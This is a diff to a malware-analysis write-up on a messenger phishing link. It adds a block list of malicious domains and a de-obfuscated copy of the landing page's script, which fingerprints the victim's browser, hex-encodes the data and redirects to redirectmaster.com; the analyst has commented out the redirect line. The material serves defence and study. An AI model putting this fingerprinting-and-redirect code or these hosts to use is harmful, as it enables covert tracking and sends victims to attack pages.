@@ -10,13 +10,14 @@
 
     Block network trafic to and from 137.184.228.130
     Block network trafic to and from Phot0.cr9pa.xyz, Phot0.hgy9t.xyz, Phot0.jgl9t.com, Phot0.php3d.online, Phot0.swq2q.com, Photo.gwx5q.com, Phot0.fnx4p.com, Phot0.jh4s.ques, Phot0.tr5se.com
+    Block network trafic to and from redirectmaster.com
     Block files containing significant code snippets of the malware
 
 ## 1. Attack vector
 
     The link https://phot0.tr5se.com/TB7mT95P is transmitted to an unsuspecting victim by means of messenger, together with a little text in the sense of 'look what I found'.
 
-    When the victim clicks the link...
+    When the victim clicks the link a hex encoded version of gathered browser info is send to redirectmaster.com which handles the gathered info and redirects the unsuspecting user towards webpages that can do all kinds of malicious things.
 
 ## 2. Server
 
@@ -321,4 +322,186 @@
           (document,window,navigator,screen);
         </script>
       </body>
+    </html>
+
+#### 3.3 File contents (Manually cleaned up)
+
+    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+
+    <html xmlns="http://www.w3.org/1999/xhtml">
+
+        <head>
+        
+            <title>Loading...</title>
+
+            <meta name="viewport" content="width=320,initial-scale=1" />
+                
+            <style type="text/css">
+                body,html
+                    {
+                    background:#fff;
+                    height:100%;
+                    margin:0;
+                    text-align:center
+                    }
+                body:before
+                    {
+                    content:"";
+                    display:inline-block;
+                    vertical-align:middle;
+                    height:100%
+                    }
+                div
+                    {
+                    font:bold 28px/160px arial;
+                    display:inline-block;
+                    color:#000;
+                    background:#32ad38;
+                    text-align:center;
+                    border-radius:50%;
+                    -moz-border-radius:50%;
+                    -webkit-border-radius:50%;
+                    width:160px;
+                    vertical-align:middle
+                    }
+            </style>
+
+        </head>
+
+        <body>
+
+            <div>Loading</div>
+
+            <script type="text/javascript">
+
+                !function() {
+                    var t=0;
+
+                    setInterval(
+                        function() { document.body.firstChild.style.opacity=.5+Math.abs(50-t++%100)/100 },
+                        10
+                        )
+
+                    }();
+
+                !function() {
+
+                    function encodeString(n) {
+
+                        function t(n) {
+                            return(n<16?"0":"")+n.toString(16)
+                            }
+
+                        for(var r="", e=137, i=0; i<n.length; ++i) {
+                            var u=170^n.charCodeAt(i)^255&i, e=e+u&255;
+                            r += t(u)
+                            }
+ 
+                        return r += t(e)
+                        }
+
+                    function getInfo() {
+
+                        //
+                        // Get system info
+                        // Remark: 'void 0' is synonym for 'undefined'
+                        //    
+                        var systemInfo = [];
+                        var timestamp1 = new Date;
+ 
+                        try { systemInfo.push( navigator.platform                                                                                   ); } catch { systemInfo.push("!"); }                    
+                        try { systemInfo.push( "ontouchstart"in window||"onmsgesturechange"in o ? 1 : void 0                                        ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.availWidth                                                                                    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.availHeight                                                                                   ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( navigator.plugins&&c.plugins.length || void 0                                                        ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( (window.ontouchstart+"")[0]                                                                          ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( (window.onmsgesturechange+"")[0]                                                                     ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( window.MSGesture ? 1 : void 0                                                                        ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( window.innerWidth                                                                                    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( window.innerHeight                                                                                   ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( timestamp1.getTimezoneOffset()                                                                       ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( (new Date).getTime()-timestamp1.getTime()                                                            ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( navigator.buildID                                                                                    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( navigator.cookieEnabled ? 1 : void 0                                                                 ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( navigator.performance&&c.performance.navigation&&c.performance.navigation.redirectCount || void 0    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( navigator.performance&&c.performance.navigation&&c.performance.navigation.type || void 0             ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.msOrientation||screen.mozOrientation||(screen.orientation||{ } ).type                         ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( window.devicePixelRatio                                                                              ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( navigator.vendor                                                                                     ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.pixelDepth                                                                                    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.colorDepth                                                                                    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.deviceXDPI                                                                                    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.deviceYDPI                                                                                    ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( ("function"==typeof(document.hasFocus)) ? document.hasFocus() : void 0                               ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( ("function"==typeof(document.getComputedStyle)) ? 1 : void 0                                         ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( (window.history && ("function"==typeof(window.history.pushState))) ? 1 : void 0                      ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.width                                                                                         ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( screen.height                                                                                        ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( void 0                                                                                               ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( void 0                                                                                               ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( window.self===window.top ? void 0 : 1                                                                ); } catch { systemInfo.push("!"); }
+                        try { systemInfo.push( navigator.webdriver ? 1 : void 0                                                                     ); } catch { systemInfo.push("!"); }
+
+                        //
+                        // Get a hash of the available window functions
+                        //
+                        var availableFunctions = [];
+                        var availableFunctionsStr;
+                        var availableFunctionsHash;
+                        var u = 0;
+                        var r = 3735928559^u;
+                        var e = 1103547991^u;
+                        var t;
+
+                        for(var func in window) availableFunctions.push(func);
+                        availableFunctions.sort();
+                        availableFunctionsStr = availableFunctions.join("\0");                    
+ 
+                        for(var n=0; n<availableFunctionsStr.length; n++) {
+                            t = availableFunctionsStr.charCodeAt(n);
+                            r = Math.imul(r^t,2654435761);
+                            e = Math.imul(e^t,1597334677);
+                            }
+                        r = Math.imul(r^r>>>16,2246822507)^Math.imul(e^e>>>13,3266489909)
+                        availableFunctionsHash = 4294967296*(2097151&(e=Math.imul(e^e>>>16,2246822507)^Math.imul(r^r>>>13,3266489909)))+(r>>>0)
+
+                        try { systemInfo.push( availableFunctionsHash ); } catch { info.push("!"); }
+
+                        //
+                        // Convert system info to some kind of a hex string
+                        //                    
+                        return encodeString( systemInfo.join("\0") )
+                        }
+
+                    //
+                    // Get system info in hex string format,
+                    // send error string in case of problem,
+                    // include extreme proglem case: empty string
+                    //
+                    var hexSystemInfo;
+ 
+                    try {
+                        hexSystemInfo = getInfo()
+                        }
+                    catch(errMsg) {
+                        try {
+                            hexSystemInfo = str2hex( [0,errMsg.message||errMsg].join("\0") )
+                            }
+                        catch {
+                            hexSystemInfo = ""
+                            }
+                        }
+
+                    //
+                    // Prevent transmission of systemInfo and activation of malware
+                    //
+                    // o.location.replace("https://www2.redirectmaster.com/?utm_termq24004551006355509&ver=4viyaptcjo&utm_content="+t)
+
+                    }();
+
+            </script>
+
+        </body>
+
     </html>
